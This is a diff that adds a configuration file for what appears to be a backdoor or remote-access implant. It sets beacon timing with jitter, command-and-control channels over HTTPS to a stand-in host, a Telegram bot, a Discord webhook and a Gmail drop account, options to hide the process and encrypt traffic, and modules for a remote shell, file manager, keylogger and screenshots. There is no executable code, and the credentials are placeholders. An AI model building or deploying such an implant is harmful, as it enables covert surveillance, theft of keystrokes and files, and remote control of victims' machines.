@@ -1,0 +1,27 @@
+[beacon]
+interval = 30
+jitter = 0.3
+
+[communication.https]
+host = "c2.example.com"
+port = 443
+path = "/api/beacon"
+
+[communication.telegram]
+bot_token = "YOUR_TELEGRAM_BOT_TOKEN"
+chat_id = "YOUR_TELEGRAM_CHAT_ID"
+
+[communication.discord]
+webhook_url = "https://discord.com/api/webhooks/xxx"
+
+[communication.gmail]
+email = "backdoor-cassandra.receiver@gmail.com"
+app_password = "YOUR_GMAIL_APP_PASSWORD"
+
+[security]
+encrypt_comms = true
+compress_data = true
+hide_process = true
+
+[modules]
+enabled = ["shell", "file_manager", "keylogger", "screenshot"]
